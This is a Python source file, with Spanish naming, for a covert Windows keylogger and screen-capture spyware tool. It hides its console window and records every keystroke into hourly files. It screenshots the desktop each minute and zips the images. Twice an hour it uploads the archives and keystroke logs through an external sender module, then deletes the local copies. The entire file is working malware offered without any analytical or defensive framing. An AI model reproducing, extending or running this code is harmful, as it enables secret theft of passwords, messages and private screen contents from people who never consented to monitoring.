from sender import enviar_documento
from utils import verificar_modulo
from utils import instalar_modulo
from datetime import timedelta
from datetime import datetime
import threading
import asyncio
import zipfile
import ctypes
import time
import os


def limpiar_consola():
    os.system('cls')


def cargar_dependencias():
    global keyboard, pyautogui, Image

    if not verificar_modulo("pynput"):
        instalar_modulo("pynput")

    if not verificar_modulo("pyautogui"):
        instalar_modulo("pyautogui")

    if not verificar_modulo("pillow"):
        instalar_modulo("pillow")

    from pynput import keyboard
    import pyautogui
    from PIL import Image


def fecha_actual():
    return datetime.now().strftime("%d-%m-%Y")


def hora_actual():
    return datetime.now().strftime("%H")


def minuto_actual():
    return datetime.now().strftime("%M")


def carpeta_utils():
    user_folder = os.path.expanduser("~\\Documents")
    carpeta = os.path.join(user_folder, "Utils", "Docs")

    if not os.path.exists(carpeta):
        os.makedirs(carpeta, exist_ok=True)

    return carpeta


def carpeta_teclas():
    user_folder = os.path.expanduser("~\\Documents")
    carpeta = os.path.join(user_folder, "Utils", "etc")

    if not os.path.exists(carpeta):
        os.makedirs(carpeta, exist_ok=True)

    return carpeta


def eliminar_documento_hora_anterior(carpeta, fecha):
    hora_anterior = (datetime.now() - timedelta(hours=1)).strftime("%H")
    archivo_anterior = os.path.join(carpeta, f"{fecha}_{hora_anterior}.txt")

    if os.path.exists(archivo_anterior):
        os.remove(archivo_anterior)
        print(f"Archivo eliminado: {archivo_anterior}")


def al_presionar_tecla(tecla):
    carpeta = carpeta_teclas()
    fecha = fecha_actual()
    hora = hora_actual()
    ruta_documento = os.path.join(carpeta, f"{fecha}_{hora}.txt")
    eliminar_documento_hora_anterior(carpeta, fecha)

    try:
        with open(ruta_documento, "a") as archivo:
            if hasattr(tecla, 'char') and tecla.char is not None:
                tecla = tecla.char
                archivo.write(tecla)

            elif tecla == keyboard.Key.space:
                archivo.write(" ")

            elif tecla == keyboard.Key.enter:
                archivo.write("\n")

    except Exception as e:
        print(f"Error occurred: {e}")


def hide_console():
    try:
        kernel32 = ctypes.windll.kernel32
        hwnd = kernel32.GetConsoleWindow()

        if hwnd:
            user32 = ctypes.windll.user32
            user32.ShowWindow(hwnd, 0)

    except Exception as e:
        print(f"Error occurred while hiding the console: {e}")


def eliminar_archivo(ruta_archivo):
    if os.path.exists(ruta_archivo):
        os.remove(ruta_archivo)

    else:
        print(f"Error occurred")


def compress_image(input_image_path, output_image_path, quality=85):

    with Image.open(input_image_path) as img:

        if img.mode in ('RGBA', 'LA'):
            img = img.convert('RGB')

        img.save(output_image_path, "JPEG", quality=quality) if output_image_path.lower().endswith(
            '.jpg') else img.save(output_image_path, "PNG", optimize=True, compress_level=9)


def comprimir_archivos_en_carpeta(carpeta_origen, nombre_archivo):
    try:
        if not os.path.exists(carpeta_origen):

            raise FileNotFoundError(f"La carpeta {carpeta_origen} no existe.")

        nombre_zip = nombre_archivo + ".zip"
        ruta_zip = os.path.join(carpeta_origen, nombre_zip)

        with zipfile.ZipFile(ruta_zip, 'a', zipfile.ZIP_DEFLATED) as archivo_zip:

            for carpeta_raiz, _, archivos in os.walk(carpeta_origen):

                for archivo in archivos:
                    ruta_completa = os.path.join(carpeta_raiz, archivo)

                    if ruta_completa != ruta_zip:
                        archivo_zip.write(ruta_completa, os.path.relpath(
                            ruta_completa, carpeta_origen))

                        try:
                            os.remove(ruta_completa)
                            print(f"Archivo eliminado: {ruta_completa}")

                        except Exception as e:
                            print(f"Error al eliminar el archivo {
                                  ruta_completa}: {e}")

        print(f"Archivo ZIP creado/reemplazado: {ruta_zip}")

        return ruta_zip

    except Exception as e:
        print(f"Error al comprimir archivos: {e}")

        return None


def generar_horas_con_minuto_menos():
    horas = []

    for hora in range(24):
        horas.append(f"{hora:02d}:59")
        horas.append(f"{hora:02d}:29")

    return horas


def sincronizar_inicio(tiempo):
    ahora = datetime.now()
    segundos_para_inicio = tiempo - (ahora.second % tiempo)

    if segundos_para_inicio == tiempo:
        segundos_para_inicio = 0

    print(f"Esperando {segundos_para_inicio} segundos hasta el próximo múltiplo de {
          tiempo} segundos.")
    time.sleep(segundos_para_inicio)
    print("Inicio sincronizado!")


def screenshot():
    while True:
        carpeta = carpeta_utils()
        fecha = fecha_actual()
        hora = hora_actual()
        minuto = minuto_actual()
        ruta_imagen = os.path.join(carpeta, f"{fecha}_{hora}_{minuto}.png")
        ruta_imagen_comprimida = os.path.join(
            carpeta, f"{fecha}_{hora}_{minuto}_lite.jpg")

        try:
            pyautogui.screenshot().save(ruta_imagen)
            time.sleep(1)
            compress_image(ruta_imagen, ruta_imagen_comprimida, quality=40)
            time.sleep(1)
            eliminar_archivo(ruta_imagen)
            comprimir_archivos_en_carpeta(carpeta, f"{fecha}_{hora}")

        except PermissionError as e:
            print(f"Error occurred: {e}")

        except Exception as e:
            print(f"Error occurred: {e}")

        sincronizar_inicio(60)


class EnvioRecopilados:
    def __init__(self):
        self.imagenes_pendientes = []
        self.documentos_pendientes = []
        self.fallidos = 0
        self.exitosos = 0

    async def detectar_horas(self, accion):
        horas_objetivo = generar_horas_con_minuto_menos()
        print("Iniciando detección de horas...")

        while True:
            hora_actual = datetime.now().strftime("%H:%M")

            if hora_actual in horas_objetivo:
                print(f"Hora detectada: {hora_actual}")
                await accion()
                await asyncio.sleep(600)

            else:
                await asyncio.sleep(60)

    async def enviar_archivos_async(self):
        carpeta_imgs = carpeta_utils()
        carpeta_keys = carpeta_teclas()
        fecha = fecha_actual()
        hora = hora_actual()
        ruta_zip = os.path.join(carpeta_imgs, f"{fecha}_{hora}.zip")
        ruta_txt = os.path.join(carpeta_keys, f"{fecha}_{hora}.txt")

        try:
            if os.path.exists(ruta_zip):
                await enviar_documento(ruta_zip)
                eliminar_archivo(ruta_zip)
                await asyncio.sleep(2)
                await enviar_documento(ruta_txt)
                eliminar_archivo(ruta_txt)
                print(f"Documento enviado con éxito: {ruta_zip}")

            else:
                print(f"Archivo no encontrado: {ruta_zip}")
                self.imagenes_pendientes.append(ruta_zip)

        except Exception as e:
            print(f"Error al enviar la el documento: {e}")

    async def reenvio_fallidos(self):
        intentos_imagenes = {}
        intentos_documentos = {}

        while True:
            try:
                cantidad_archivos_pendientes = len(self.imagenes_pendientes)
                cantidad_documentos_pendientes = len(
                    self.documentos_pendientes)

                if cantidad_archivos_pendientes > 0:
                    for archivo in self.imagenes_pendientes[:]:
                        if archivo not in intentos_imagenes:
                            intentos_imagenes[archivo] = 0

                        try:
                            await enviar_documento(archivo)
                            self.exitosos += 1
                            self.imagenes_pendientes.remove(archivo)
                            del intentos_imagenes[archivo]

                        except Exception as e:
                            print(f"Error al reenviar imagenes {archivo}: {e}")
                            intentos_imagenes[archivo] += 1
                            self.fallidos += 1

                            if intentos_imagenes[archivo] >= 3:
                                print(f"Eliminando imagenes {
                                      archivo} tras 3 intentos fallidos")
                                self.imagenes_pendientes.remove(archivo)
                                eliminar_archivo(archivo)
                                del intentos_imagenes[archivo]

                if cantidad_documentos_pendientes > 0:
                    for documento in self.documentos_pendientes[:]:
                        if documento not in intentos_documentos:
                            intentos_documentos[documento] = 0

                        try:
                            await enviar_documento(documento)
                            self.exitosos += 1
                            self.documentos_pendientes.remove(documento)
                            del intentos_documentos[documento]

                        except Exception as e:
                            print(f"Error al enviar documento {
                                  documento}: {e}")
                            intentos_documentos[documento] += 1
                            self.fallidos += 1

                            if intentos_documentos[documento] >= 3:
                                print(f"Eliminando documento {
                                      documento} tras 3 intentos fallidos")
                                self.documentos_pendientes.remove(documento)
                                del intentos_documentos[documento]

                await asyncio.sleep(60)

            except Exception as e:
                print(f"Ocurrió un error en el ciclo principal: {e}")
                self.fallidos += 1

    async def enviar_recopilados(self):
        await asyncio.gather(
            self.enviar_archivos_async()
        )

    async def envios_main(self):
        await self.detectar_horas(self.enviar_recopilados)


def main():
    cargar_dependencias()
    hide_console()

    captura_hilo = threading.Thread(target=screenshot, daemon=True)
    captura_hilo.start()

    envio_recopilados = EnvioRecopilados()
    envio_recopilados_hilo = threading.Thread(target=lambda: asyncio.run(
        envio_recopilados.envios_main()), daemon=True)
    envio_recopilados_hilo.start()

    envio_recopilados_hilo = threading.Thread(target=lambda: asyncio.run(
        envio_recopilados.reenvio_fallidos()), daemon=True)
    envio_recopilados_hilo.start()

    with keyboard.Listener(on_press=al_presionar_tecla) as listener:
        listener.join()


if __name__ == "__main__":
    limpiar_consola()
    main()

    while True:
        pass
